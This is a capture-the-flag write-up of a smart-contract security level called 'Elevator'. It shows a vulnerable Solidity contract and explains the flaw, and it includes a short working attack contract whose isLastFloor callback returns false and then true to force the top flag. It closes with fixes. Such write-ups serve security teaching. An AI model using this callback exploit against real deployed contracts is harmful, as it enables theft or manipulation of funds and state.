# Level 11: Elevator

## Goal

Reach the top of the building (set `top` to true).

## The contract

```solidity
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

## Vulnerability

`Elevator` calls `isLastFloor` on `msg.sender` and trusts it. `isLastFloor` is not `view`, so a malicious implementation can return different values on each call. It is called twice: the first must return `false` (to enter the branch), the second `true` (to set `top = true`). A malicious Building just toggles its answer.

## Exploit

```solidity
contract ElevatorAttack {
    bool private toggle = true;

    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return toggle; // first call -> false, second -> true
    }

    function attack(address elevator) external {
        Elevator(elevator).goTo(1);
    }
}
```

Call `attack(elevatorAddress)`: first `isLastFloor` returns false (enter branch), second returns true (`top = true`).

## Fix

- Mark functions that must not change state as `view` in the interface so the compiler enforces it.
- Never call an untrusted contract twice and assume consistent answers.
- Do not base critical logic on unverified external return values.

## Takeaway

Trusting an external contract to behave consistently is a mistake. A non-`view` function can return a different answer every call.
